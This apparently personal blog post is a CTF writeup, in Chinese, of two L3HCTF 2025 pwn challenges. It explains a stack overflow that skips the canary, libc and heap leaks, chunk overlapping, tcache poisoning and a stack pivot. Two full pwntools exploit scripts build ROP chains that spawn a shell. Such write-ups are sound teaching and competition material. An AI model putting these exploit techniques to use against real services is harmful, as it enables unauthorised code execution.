---
date: 2025-07-13 10:21:59
layout: post
title: L3HCTF 2025 writeup
subtitle: 
description: >-
    
image: >-
  /assets/img/uploads/starrail-bailu.jpg
optimized_image: >-
  /assets/img/uploads/starrail-bailu.jpg
category: ctf
tags:
  - l3hctf 2025
  - heack
  - heack-revenge
author: rosayxy
paginate: true
---
这次比赛做了两个题，heack 和 heack-revenge, 感觉都很有意思！pwn 方向另一个题 Library, 有了 stack leak 之后没思路   
也恭喜一下自家战队成功入围 XCTF FINAL 2025！    

## heack
漏洞函数如下    

```c
__int64 __fastcall fight_dragon(unsigned __int64 a1)
{
  int v1; // eax
  char buf[260]; // [rsp+10h] [rbp-110h] BYREF
  unsigned int v4; // [rsp+114h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+118h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("\n[Battle] Engaging the dragon!");
  puts("As you lay eyes upon the dread dragon, your blood boils with the urge to challenge it!");
  printf("You grip your sword and shout:");
  v4 = 0;
  while ( read(0, buf, 1uLL) == 1 && buf[0] != 10 )
  {
    v1 = v4++;
    buf[v1 + 1] = buf[0];
  }
  if ( a1 <= 0xFFFF )
  {
    puts("TRIP ATTACK! (Critical Hit)\nYour fumbling dagger strike somehow finds the dragon's vulnerability!");
    puts(&byte_2480);
  }
  else
  {
    puts("\nThe mighty dragon takes one look at you, whimpers, and bolts away like a scared kitten. You win... by default?");
  }
  return v4;
}
```
劫持控制流很常规，我们先溢出覆盖 `v4` 即为 index 低位为 `\x17` 从而可以让下一个写入的地方为返回地址的最低位，从而跳过了对 canary 的覆盖

我们可以注意到 rsi 在 `leave; ret` 的时候值和 libc 地址固定偏移如下
![alt_text](/assets/img/uploads/rsi_val.png)

我们看到 game 函数里面有如下代码  
```c
printf("[Attack]: %lu\n", attack);
```
我们 partial overwrite 返回地址的最后两个 byte，劫持到此处来输出 rsi 的值（因为覆盖两个字节，所以需要），从而 leak libc 地址   

然后我们再次进入该函数，覆盖 v4 低位为 `\x17`，然后构造 ROP chain 覆盖返回地址即可    

### exp

```py
from pwn import *
context(log_level='debug', arch='amd64', os='linux')
# p = remote("1.95.8.146", 9999)
p = process("./vul2")
libc = ELF("./lib/libc.so.6")

def add(idx, size, content):
    p.recvuntil("Choose an option: ")
    p.sendline("1")
    p.recvuntil("Enter index (0-15): ")
    p.sendline(str(idx))
    p.recvuntil("Enter diary content size (1-2048): ")
    p.send(str(size))
    p.recvuntil("Input your content: ")
    p.send(content)

def delete(idx):
    p.recvuntil("Choose an option: ")
    p.sendline("2")
    p.recvuntil("Enter index to destroy (0-15): ")
    p.sendline(str(idx))
    
def add_shutdown(idx, size):
    p.recvuntil("Choose an option: ")
    p.sendline("1")
    p.recvuntil("Enter index (0-15): ")
    p.sendline(str(idx))
    p.recvuntil("Enter diary content size (1-2048): ")
    p.send(str(size))
    p.recvuntil("Input your content: ")
    p.shutdown("send")

# TODO 先添加 padding, 使得对齐
p.recvuntil("> ")
p.sendline("1")
gdb.attach(p, "b* $rebase(0x191a)")
pause()
p.recvuntil("You grip your sword and shout:")
p.sendline(b"a"*259 + b"\x17" + p16(0x191a))
p.recvuntil("[Attack]: ")
libc_leak = int(p.recvuntil("\n").strip())
log.info(f"libc leak: {hex(libc_leak)}")

libc_base =  libc_leak -  0x204643
log.info(f"libc base: {hex(libc_leak - 0x204643)}")
pop_rdi_ret = libc_base + 0x10f75b
ret = libc_base + 0x10f75c
system = libc_base + libc.symbols['system']
binshell = libc_base + 0x1CB42F
p.recvuntil("> ")
p.sendline("1")
# gdb.attach(p)
# pause()
p.recvuntil("You grip your sword and shout:")
p.sendline(b"a"*259 + b"\x17" + p64(ret) + p64(pop_rdi_ret) + p64(binshell) + p64(system))

p.interactive()
```

## heack-revenge

在以下叙述中，堆块地址指的是 malloc 返回的，在 header 之后的真正用来写的起始地址，堆块 header 地址指的是 malloc 返回的地址 - 0x10，即是指向该堆块 header 的地址   

本题对 heack 题目里面劫持控制流的能力进行了限制，具体来说，`fight_dragon` 函数中，返回地址只能覆盖最低一个字节，并且该函数只能调用一次，调用第二次则会在函数开头 `exit` 掉

除此之外，没有其他可利用漏洞

我们需要考虑，劫持返回地址到什么地方才能方便后续利用

在这个点上卡了很久，最后还是杰哥找到了合适的 gadget（让我们说：谢谢杰哥！）   
大概就是考虑到它有魔数如下   
```c
  v5 = 19533573;
  v6 = 2035549;
  v7 = 20250712;
  printf("Data: %d\n", 20250712LL);
```
这个 v7 是 v5 ^ v6 算出来的，杰哥就反应到了 v6 的值 `1F0F5Dh` 比较眼熟   
我们在这两个指令附近用 gdb 解析指令找 gadget   
```
pwndbg> x/20gi $rebase(0x186a)
   0x55555555586a <game+65>:    pop    rbp
   0x55555555586b <game+66>:    nop    DWORD PTR [rax]
   0x55555555586e <game+69>:    mov    edx,DWORD PTR [rbp-0x18]
   0x555555555871 <game+72>:    mov    eax,DWORD PTR [rbp-0x14]
```

得到了以上结果

我们分析一下这个 pop rbp gadget 的作用，首先，在 `[rsp+0h] [rbp-B0h]` 的位置有一个 notes_ptr_buffer，是存的菜单功能中，malloc 分配的堆指针，然后 pop rbp 的时候，rbp 会被赋值为 notes_ptr_buffer[0]，也就是 index = 0 的 note 对应的堆块地址，简单画个图吧   

![alt_text](/assets/img/uploads/pop_rbp.jpg)

然后它 main 里面整体由 rbp 相对寻址，所以当调用菜单堆函数的时候，第一个参数就是 `rbp - 0xb0`，也就还是堆地址，**为了后文叙述方便，我们称其为 `notes_buffer`**   

### heap leak
之后就是纯的堆题了哈哈哈   
我们之前为什么感觉堆没啥漏洞，是因为它存 notes 的 buffer 初始化为全 0，然后堆操作是真的没洞啊

但是现在，我们 `notes_buffer` 里面是可以残留有之前堆上指针的，所以就可以用它来 leak    

具体来说，我们构造如下堆布局   

![alt_text](/assets/img/uploads/heack_revenge_heap2.jpg)

我们先 free 7 个堆块，来填满 tcache，然后依次 free idx 1, 14, 7 的堆块到 unsorted bin，为什么 unsorted bin 堆块要这样 free 的顺序会后续讲到

此时，我们 notes_buffer 和 idx 为 1 的堆块地址相同，该堆块现在在 unsorted bin 中，所以它 fd 指向的地址是 main_arena 里面 top_chunk 所被存的地址，其 content 也就是 top_chunk 的地址，而该地址会被认为是一个 note 的起始地址，所以通过 `show(0)` 函数可以 leak top_chunk 的地址，即是得到堆的起始地址    
这个为什么是 top_chunk 所被存的地址可以见 [这个博客](https://rosayxy.github.io/codegate-quals-2025-writeup/)   

### libc_leak
我们同时观察到，这个 idx 为 1 的堆块的 bk 为 idx 14 的堆块 header 地址，注意，该 header 地址不同于堆块本身的地址，而我们在菜单中，具有 free 该 header 地址的功能

所以就很自然的想到了 chunk overlapping 的构造，我们构造如下   
![alt_text](/assets/img/uploads/heack_revenge_heap3.jpg)
![alt_text](/assets/img/uploads/idx1_chunk.png)

注意，堆块的内容都是在一开始 create 的时候写进去的，因为该题没有 edit 功能   

我们首先 `delete(1)` 来 free fake chunk，然后再把它申请出来，这样就可以覆盖 idx 15 和 idx 1 的结构体了！

注意我们申请的 fake chunk 所保存在的 index 要比较大，如果 index 比较小的话，则 memset fake chunk 为 0 的时候会覆盖掉我们的指针，之后会因为向 0 地址写入而 crash

**冷知识，chunk overlapping 很多情况下可以造成 UAF 的效果，所以非常好用**

但是这个 leak libc 不是用的 uaf，我们直接覆盖 notes_buffer 里面第一个指针为 idx 7 的堆块地址 + 8，这样 `show(0)` 正好可以 leak libc 基地址，属于利用题目中的结构去 leak 而非堆块本身的结构   

而在这一步之后，我们之前所要回答的 unsorted bin 的 free 顺序就很直观了

有如下条件：
1. idx = 1 的堆块 fd 和 bk 中，一个是 arena top_chunk 所存的地址，一个是 idx = 14 的堆块 header 地址
2. idx = 7 的堆块 fd 和 bk 中，需要一个是 arena top_chunk 所存的地址，方便 leak（因为 idx = 14，idx = 1 上，如果有 libc 残存的地址的话，会在申请堆重叠 chunk 的时候被 memset 为0，所以要保证被重叠的堆块之外有残存的 libc 地址）

由此可知，应该第二个 free idx = 14 的堆块，idx = 1，idx = 7 的 free 顺序是无所谓的

同时，我们这一步因为可以 cover tcache chunk 的 fd，所以就可以有 libc/heap 任意地址分配的能力！  

### control flow hijack
我们在 game 函数中，rbp 是堆地址，rsp 是原先的栈地址，从 `game` 返回到 main 的时候 `leave; ret` 会将 rbp 的值赋给 rsp，然后从 rsp 处 pop 一个给 rbp，再跳转到 rsp 所指向的内容继续执行

所以此时 rsp 被迁移到了堆上！

我们利用 tcache poisoning，在 rsp 要返回到的地址处申请出来堆块，构造 rop chain 并且写上去，最终实现了控制流劫持

### exp
```py
from pwn import *
context(log_level='debug', arch='amd64', os='linux')
p = remote("1.95.8.146", 19999)

libc = ELF("./lib/libc.so.6")

def add(idx, size, content):
    p.recvuntil("Choose an option: ")
    p.sendline("1")
    p.recvuntil("Enter index (0-15): ")
    p.sendline(str(idx))
    p.recvuntil("Enter diary content size (1-2048): ")
    p.send(str(size))
    p.recvuntil("Input your content: ")
    p.send(content)

def delete(idx):
    p.recvuntil("Choose an option: ")
    p.sendline("2")
    p.recvuntil("Enter index to destroy (0-15): ")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil("Choose an option: ")
    p.sendline("3")
    p.recvuntil("Enter index to view (0-15): ")
    p.sendline(str(idx))

def note_exit():
    p.recvuntil("Choose an option: ")
    p.sendline("4")


# basic preparations
p.recvuntil("> ")
p.sendline("5")
for i in range(8, 13):
    add(i, 0xa0, b"a\n")
add(13, 0xa2, b"a"*0x90 + p64(0) + p64(0x1c1) + b"\n")
add(14, 0xa0, b"a\n")
add(15, 0xa0, b"a\n")
add(1, 0xa1, b"a"*0x40 + p64(0) + p64(0x21) + b"a"*0x10 + p64(0) + p64(0x21) + b"\n")
add(0, 0x300, p64(0) + p64(0x21) + b"a"*16 + p64(0) + p64(0x21) + b"\n")
add(7, 0xa0, b"a\n") # for leaks
add(6, 0xa0, b"don't want to consolidate with top\n")
for i in range(8, 14):
    delete(i)
delete(15)

delete(1)
delete(14)
delete(7)
note_exit()

# ret to 0x6a
# gdb.attach(p, '''
# b* $rebase(0x0171A)
# b* $rebase(0x01A1E)
# ''')
# pause()
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("You grip your sword and shout:")
p.sendline(b"a"*35 + b"\x37" + p8(0x6a))
p.recvuntil("> ")
p.sendline("5")
show(0)
p.recvuntil("--- Diary Entry 0 ---\n")
heap_leak = u64(p.recv(6).strip().ljust(8, b'\x00'), 16)
log.info(f"heap leak: {hex(heap_leak)}")
heap_base = heap_leak - 0xd30
log.info(f"heap base: {hex(heap_base)}")
# gdb.attach(p, "b* $rebase(0x141d)")
# pause()
delete(1)
# # construct payload to do stuff
pos = heap_base + 0x8d0 # cover tcache perthread struct
payload = p64(0) + p64(0xb1) + b"a"*0xa0 + p64(0) + p64(0xb1) + p64(pos ^ (heap_leak//0x1000)) + p64(heap_base + 0x10) + b"\x00" * 0x90 + p64(0xb0) + p64(0xb0) + p64(heap_base + 0xbe8) + b"\n"
add(15, 0x1b0, payload)
show(0)
p.recvuntil("--- Diary Entry 0 ---\n")
libc_leak = u64(p.recv(6).ljust(8, b'\x00'), 16)
log.info(f"libc leak: {hex(libc_leak)}")
# 0x7f41346feb20
libc_base = libc_leak - 0x203b20
log.info(f"libc base: {hex(libc_base)}")
# 从 game 返回时会栈迁移
# write stuff at heap_base + 0x8d8
pop_rdi_ret = libc_base + 0x10f75b
ret = libc_base + 0x10f75c
system = libc_base + libc.symbols['system']
binshell = libc_base + 0x1CB42F

add(2, 0xa0, "something\n")
add(3, 0xa0, p64(0) + p64(ret) + p64(pop_rdi_ret) + p64(binshell) + p64(system) + b"\n")
note_exit()
p.recvuntil("> ")
p.sendline("7")


p.interactive()
```
### 总结
1. 有堆重叠之后，unsorted bin 的结构被破坏了，所以要尽量通过 tcache 申请和释放，否则会出锅
2. 改 rbp 并且通过 rbp 相对寻址来做后续利用的方法，之前在 TSG CTF 也见过一次，详情见 [这个 writeup](https://rosayxy.github.io/writeups/#piercing-misty-mountain---tsg-ctf-2024)   

## Library
现在卡题了，在蹲其他师傅放 writeup